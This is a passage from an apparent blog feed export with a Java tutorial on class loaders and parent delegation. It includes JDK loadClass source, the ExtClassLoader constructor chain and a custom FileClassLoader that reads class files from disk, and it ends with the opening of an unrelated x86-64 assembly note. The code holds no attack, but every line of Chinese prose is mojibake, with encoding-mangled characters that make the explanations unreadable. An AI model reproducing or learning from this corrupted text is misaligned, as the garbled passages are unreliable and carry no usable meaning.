ï¼Œjavaæ ¸å¿ƒapiä¸­å®šä¹‰ç±»å‹ä¸ä¼šè¢«éšæ„æ›¿æ¢ï¼Œå‡è®¾é€šè¿‡ç½‘ç»œä¼ é€’ä¸€ä¸ªåä¸ºjava.lang.Integerçš„ç±»ï¼Œé€šè¿‡åŒäº²å§”æ‰˜æ¨¡å¼ä¼ é€’åˆ°å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œè€Œå¯åŠ¨ç±»åŠ è½½å™¨åœ¨æ ¸å¿ƒJava APIå‘ç°è¿™ä¸ªåå­—çš„ç±»ï¼Œå‘ç°è¯¥ç±»å·²è¢«åŠ è½½ï¼Œå¹¶ä¸ä¼šé‡æ–°åŠ è½½ç½‘ç»œä¼ é€’çš„è¿‡æ¥çš„java.lang.Integerï¼Œè€Œç›´æ¥è¿”å›å·²åŠ è½½è¿‡çš„Integer.classï¼Œè¿™æ ·ä¾¿å¯ä»¥é˜²æ­¢æ ¸å¿ƒAPIåº“è¢«éšæ„ç¯¡æ”¹ã€‚å¯èƒ½ä½ ä¼šæƒ³ï¼Œå¦‚æœæˆ‘ä»¬åœ¨classpathè·¯å¾„ä¸‹è‡ªå®šä¹‰ä¸€ä¸ªåä¸ºjava.lang.SingleIntergeç±»(è¯¥ç±»æ˜¯èƒ¡ç¼–çš„)å‘¢ï¼Ÿè¯¥ç±»å¹¶ä¸å­˜åœ¨java.langä¸­ï¼Œç»è¿‡åŒäº²å§”æ‰˜æ¨¡å¼ï¼Œä¼ é€’åˆ°å¯åŠ¨ç±»åŠ è½½å™¨ä¸­ï¼Œç”±äºçˆ¶ç±»åŠ è½½å™¨è·¯å¾„ä¸‹å¹¶æ²¡æœ‰è¯¥ç±»ï¼Œæ‰€ä»¥ä¸ä¼šåŠ è½½ï¼Œå°†åå‘å§”æ‰˜ç»™å­ç±»åŠ è½½å™¨åŠ è½½ï¼Œæœ€ç»ˆä¼šé€šè¿‡ç³»ç»Ÿç±»åŠ è½½å™¨åŠ è½½è¯¥ç±»ã€‚ä½†æ˜¯è¿™æ ·åšæ˜¯ä¸å…è®¸ï¼Œå› ä¸ºjava.langæ˜¯æ ¸å¿ƒAPIåŒ…ï¼Œéœ€è¦è®¿é—®æƒé™ï¼Œå¼ºåˆ¶åŠ è½½å°†ä¼šæŠ¥å‡ºå¦‚ä¸‹å¼‚å¸¸</p>
<blockquote>
<p>java.lang.SecurityException: Prohibited package name: java.lang</p>
</blockquote>
<p>æˆ‘ä»¬é€šè¿‡ä¸‹å›¾æ¥è®¤è¯†åŒäº²å§”æ´¾æœºåˆ¶ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ec421d5e6bd36ebf52f4ab62f190c06.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»å›¾å¯ä»¥çœ‹å‡ºé¡¶å±‚çš„ç±»åŠ è½½å™¨æ˜¯ClassLoaderç±»ï¼Œå®ƒæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå…¶åæ‰€æœ‰çš„ç±»åŠ è½½å™¨éƒ½ç»§æ‰¿è‡ªClassLoaderï¼ˆä¸åŒ…æ‹¬å¯åŠ¨ç±»åŠ è½½å™¨ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦ä»‹ç»ClassLoaderä¸­å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„æ–¹æ³•ã€‚</p>
<h3 id="åŒäº²å§”æ´¾çš„è¿‡ç¨‹"><a href="#åŒäº²å§”æ´¾çš„è¿‡ç¨‹" class="headerlink" title="åŒäº²å§”æ´¾çš„è¿‡ç¨‹"></a>åŒäº²å§”æ´¾çš„è¿‡ç¨‹</h3><p>æˆ‘ä»¬æ¥çœ‹çœ‹AppClassLoader#loadClassçš„ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String var1, <span class="type">boolean</span> var2) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> var1.lastIndexOf(<span class="number">46</span>);</span><br><span class="line">            <span class="keyword">if</span> (var3 != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">SecurityManager</span> <span class="variable">var4</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">                <span class="keyword">if</span> (var4 != <span class="literal">null</span>) &#123;</span><br><span class="line">                    var4.checkPackageAccess(var1.substring(<span class="number">0</span>, var3));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ucp.knownToNotExist(var1)) &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">this</span>.findLoadedClass(var1);</span><br><span class="line">                <span class="keyword">if</span> (var5 != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (var2) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.resolveClass(var5);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> var5;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(var1);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.loadClass(var1, var2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>å‰é¢æ˜¯å»ºç«‹äº†ä¸€ä¸ªå®‰å…¨ç®¡ç†å™¨å•¥çš„ï¼Œå…·ä½“å•¥æ„æ€å’±ä¹Ÿä¸æ‡‚ï¼Œè¿˜æ²¡åˆ°é‚£ä¸ªåœ°æ­¥ã€‚ä¸»è¦çš„ä»£ç æ˜¯ä¸‹é¢ä¸€ä¸ªifåˆ¤æ–­ã€‚<br>é¦–å…ˆé€šè¿‡findLoadedClassæ–¹æ³•å»ç¼“å­˜ä¸­æŸ¥æ‰¾å½“å‰ç±»æ˜¯å¦å·²ç»è¢«å®¶åœ¨è¿‡äº†ï¼Œå¦‚æœæ²¡æœ‰è¢«åŠ è½½è¿‡åˆ™è°ƒç”¨super.laodClassæ–¹æ³•å»åŠ è½½ç±»ï¼Œæˆ‘ä»¬è·Ÿè¿›super.loadClassæ–¹æ³•:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">            <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">            Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                        c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆæ˜¯è·å¾—äº†ä¸€æŠŠé”ï¼Œå…·ä½“å¹²å•¥çš„å’±ä¹Ÿä¸çŸ¥é“ã€‚ç„¶ååŒæ ·çš„è°ƒç”¨äº†findLoadedClassæ–¹æ³•å»ç¼“å­˜ä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆ™åˆ¤æ–­çˆ¶ç±»æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºåˆ™è°ƒç”¨çˆ¶ç±»çš„loadClassæ–¹æ³•åŠ è½½ç±»ï¼Œå¦‚æœä¸ºç©ºåˆ™è°ƒç”¨å¯åŠ¨ç±»åŠ è½½å™¨åŠ è½½ç±»ã€‚å¦‚æœä»ç„¶æ²¡æœ‰æ‰¾åˆ°ï¼Œå€Ÿc&#x3D;&#x3D;nullï¼Œåˆ™è°ƒç”¨findClassæ–¹æ³•ã€‚<br>è€Œæ‰©å±•ç±»åŠ è½½å™¨çš„çˆ¶ç±»æˆ‘ä»¬çŸ¥é“ä¸ºnullï¼Œé‚£ä¹ˆå…¶è‚¯å®šä¼šè®©å¯åŠ¨ç±»åŠ è½½å™¨å»åŠ è½½ç±»ã€‚<br>é‚£ä¹ˆä¸ºä»€ä¹ˆä¸ºnullå‘¢ï¼Œçœ‹ä¸‹é¢çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ExtClassLoader</span><span class="params">(File[] var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="built_in">super</span>(getExtURLs(var1), (ClassLoader)<span class="literal">null</span>, Launcher.factory);</span><br><span class="line">            SharedSecrets.getJavaNetAccess().getURLClassPath(<span class="built_in">this</span>).initLookupCache(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œæ³¨æ„è¿™é‡Œç¬¬äºŒä¸ªå‚æ•°ä¸ºnullï¼Œæˆ‘ä»¬è·Ÿè¿›å»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">URLClassLoader</span><span class="params">(URL[] urls, ClassLoader parent,</span></span><br><span class="line"><span class="params">                          URLStreamHandlerFactory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="literal">null</span>) &#123;</span><br><span class="line">            security.checkCreateClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        acc = AccessController.getContext();</span><br><span class="line">        ucp = <span class="keyword">new</span> <span class="title class_">URLClassPath</span>(urls, factory, acc);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°ç»§ç»­è°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œç»§ç»­è·Ÿï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">SecureClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="literal">null</span>) &#123;</span><br><span class="line">            security.checkCreateClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        initialized = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>ç»§ç»­è·Ÿï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">ClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(checkCreateClassLoader(), parent);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>ç»§ç»­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">ClassLoader</span><span class="params">(Void unused, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        <span class="keyword">if</span> (ParallelLoaders.isRegistered(<span class="built_in">this</span>.getClass())) &#123;</span><br><span class="line">            parallelLockMap = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">            package2certs = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">            assertionLock = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// no finer-grained lock; lock on the classloader instance</span></span><br><span class="line">            parallelLockMap = <span class="literal">null</span>;</span><br><span class="line">            package2certs = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">            assertionLock = <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçœ‹åˆ°this.parend è¢«èµ‹å€¼ä¸ºä¼ è¿›æ¥çš„å½¢å‚parentï¼Œè€Œè¿™ä¸ªå‚æ•°å€¼ä¸ºnullï¼Œæ‰€ä»¥æ‰©å±•ç±»åŠ è½½å™¨çš„çˆ¶ç±»ä¸ºnullã€‚</p>
<p>å½“æˆ‘ä»¬è·Ÿåˆ°findClassæ–¹æ³•é‡Œé¢å‘ç°äº†ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/244da1d4d3043573f856bec2aad525b0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥æŠ›å‡ºäº†å¼‚å¸¸ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬éœ€è¦åŠ è½½ä»»æ„è·¯å¾„çš„ç±»å°±éœ€è¦é‡å†™findClassæ–¹æ³•ã€‚<br>findClassæ–¹æ³•ä¸­å®ç°çš„åŠŸèƒ½å°±æ˜¯ä»æ–‡ä»¶ç³»ç»ŸåŠ è½½classæ–‡ä»¶åˆ°å†…å­˜ï¼Œç„¶åé€šè¿‡defineClassæ–¹æ³•ç”Ÿæˆä¸€ä¸ªClasså¯¹è±¡ï¼ŒdefineClassæ–¹æ³•çš„é€»è¾‘åœ¨ClassLoaderç±»ä¸­å®ç°äº†ã€‚çœ‹ä¸‹é¢çš„ä¸€ä¸ªfindClassçš„å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ­£åœ¨æŸ¥æ‰¾ç±»@&quot;</span>);</span><br><span class="line">        <span class="comment">// è·å–ç±»çš„å­—èŠ‚æ•°ç»„</span></span><br><span class="line">        <span class="type">byte</span>[] classData = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        classData = getClassData(name);</span><br><span class="line">        <span class="keyword">if</span> (classData == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨defineClassç”Ÿæˆclasså¯¹è±¡</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name, classData, <span class="number">0</span>, classData.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>getClassDataæ–¹æ³•å®ç°çš„æ˜¯ä»æ–‡ä»¶ç³»ç»ŸåŠ è½½å­—èŠ‚ç æ•°æ®ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] getClassData(String className) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ­£åœ¨è·å–å­—èŠ‚æ•°æ®&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> classNameToPath(className);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(s));</span><br><span class="line">            <span class="comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);</span></span><br><span class="line">            <span class="keyword">while</span> ((len = inputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteArrayOutputStream.write(bytes, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>classNameToPathåˆ™æ˜¯å°†è¾“å…¥çš„æ–‡ä»¶åè½¬æ¢ä¸ºå¯¹åº”è·¯å¾„çš„é€»è¾‘ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">classNameToPath</span><span class="params">(String classname)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rootDir + File.separatorChar + classname.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·ä¸€ä¸ªfindClassæ–¹æ³•çš„ç®€å•é€»è¾‘å°±å®ç°äº†ã€‚å®Œæ•´çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FileClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String rootDir;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FileClassLoader</span><span class="params">(String rootDir)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.rootDir = rootDir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ­£åœ¨æŸ¥æ‰¾ç±»@&quot;</span>);</span><br><span class="line">        <span class="comment">// è·å–ç±»çš„å­—èŠ‚æ•°ç»„</span></span><br><span class="line">        <span class="type">byte</span>[] classData = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        classData = getClassData(name);</span><br><span class="line">        <span class="keyword">if</span> (classData == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨defineClassç”Ÿæˆclasså¯¹è±¡</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name, classData, <span class="number">0</span>, classData.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">classNameToPath</span><span class="params">(String classname)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rootDir + File.separatorChar + classname.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] getClassData(String className) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ­£åœ¨è·å–å­—èŠ‚æ•°æ®&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> classNameToPath(className);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(s));</span><br><span class="line">            <span class="comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);</span></span><br><span class="line">            <span class="keyword">while</span> ((len = inputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteArrayOutputStream.write(bytes, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">rootDir</span> <span class="operator">=</span> <span class="string">&quot;E:\\desktop\\java\\javatest\\target\\classes&quot;</span>;</span><br><span class="line">        <span class="type">FileClassLoader</span> <span class="variable">fileClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileClassLoader</span>(rootDir);</span><br><span class="line"><span class="comment">//        fileClassLoader.getClassData(&quot;test&quot;);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;è‡ªå®šä¹‰ç±»åŠ è½½å™¨çš„çˆ¶åŠ è½½å™¨ï¼š&quot;</span>+fileClassLoader.getParent());</span><br><span class="line">        System.out.println(<span class="string">&quot;ç³»ç»Ÿç±»åŠ è½½å™¨ï¼š&quot;</span>+ClassLoader.getSystemClassLoader());</span><br><span class="line">        System.out.println(<span class="string">&quot;ç³»ç»Ÿç±»åŠ è½½å™¨çš„çˆ¶åŠ è½½å™¨ï¼š&quot;</span>+ClassLoader.getSystemClassLoader().getParent());</span><br><span class="line">        System.out.println(<span class="string">&quot;æ‰©å±•ç±»åŠ è½½å™¨çš„çˆ¶åŠ è½½å™¨ï¼š&quot;</span>+ClassLoader.getSystemClassLoader().getParent().getParent());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = fileClassLoader.findClass(<span class="string">&quot;com.armandhe.javabase.ClassLoaderDemo&quot;</span>);</span><br><span class="line">            System.out.println(aClass.newInstance());</span><br><span class="line">            aClass.getMethod(<span class="string">&quot;test&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;ç±»æœªå‘ç°ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5b05384bf5cd30d49c453edd95c5db86.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨ä¸Šé¢æˆ‘ä»¬æˆ‘ä»¬æåˆ°äº†åœ¨loadClassæ–¹æ³•ä¸­æœ‰ä¸€ä¸ªå‚æ•°var2ï¼Œå¦‚æœvar2&#x3D;&#x3D;trueåˆ™æ‰å“¦ç”¨äº†resolveClassæ–¹æ³•ï¼Œä½¿ç”¨è¯¥æ–¹æ³•å¯ä»¥ä½¿ç”¨ç±»çš„Classå¯¹è±¡åˆ›å»ºå®Œæˆä¹ŸåŒæ—¶è¢«è§£æã€‚å‰é¢æˆ‘ä»¬è¯´é“¾æ¥é˜¶æ®µä¸»è¦æ˜¯å¯¹å­—èŠ‚ç è¿›è¡ŒéªŒè¯ï¼Œä¸ºç±»å˜é‡åˆ†é…å†…å­˜å¹¶è®¾ç½®åˆå§‹å€¼åŒæ—¶å°†å­—èŠ‚ç æ–‡ä»¶ä¸­çš„ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨ã€‚<br>è¿˜æœ‰ä¸ªçº¿ç¨‹ä¸Šä¸‹æ–‡åŠ è½½å™¨ï¼Œå†™ä¸åŠ¨äº†ï¼ï¼ï¼å»çœ‹åŸæ–‡å§<br>jdbcå°±ä½¿ç”¨çš„çº¿ç¨‹ä¸Šçº¿æ–‡åŠ è½½å™¨ï¼Œä¸€èˆ¬æ¥è¯´çº¿ç¨‹ä¸Šä¸‹æ–‡åŠ è½½å™¨ä½¿ç”¨çš„æ˜¯ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œä½†åœ¨æŸäº›ä¸­é—´ä»¶ä¸­å…¶ä½¿ç”¨çš„æ˜¯è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨ï¼Œå¦‚tomcatã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>ç±»åŠ è½½</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿè¯»ä¹¦ç¬”è®°ï¼ˆå››ï¼‰</title>
    <url>/archives/4ef66917.html</url>
    <content><![CDATA[<ul>
<li>x86-64ä½å¯„å­˜å™¨å«æœ‰16ç»„64ä½é€šç”¨ç›®çš„å¯„å­˜å™¨ï¼Œ%rax,%bx %cx %dx %rsi %rdi %rbp %rsp %r8 %r9 â€¦.%r15ï¼Œå…¶ä¸­ç‰¹æ®Šçš„%rspå­˜å‚¨æ ˆæŒ‡é’ˆçš„å€¼ï¼Œ%raxä¸ºè¿”å›å€¼ã€‚</li>
<li>æ±‡ç¼–æœ‰ä¸¤ç§æ¶æ„ï¼Œç°åœ¨å¤§å¤šæ•°ç¼–è¯‘å™¨å¦‚GCCç­‰ä½¿ç”¨çš„éƒ½æ˜¯ATTæ¶æ„çš„ï¼Œå¦å¤–å¾®è½¯ä¸Intelçš„ç¼–è¯‘å™¨ä½¿ç”¨çš„æ˜¯Intelçš„æ¶æ„ï¼Œä¸¤è€…æœ‰ç»†å¾®çš„åŒºåˆ«ã€‚</li>
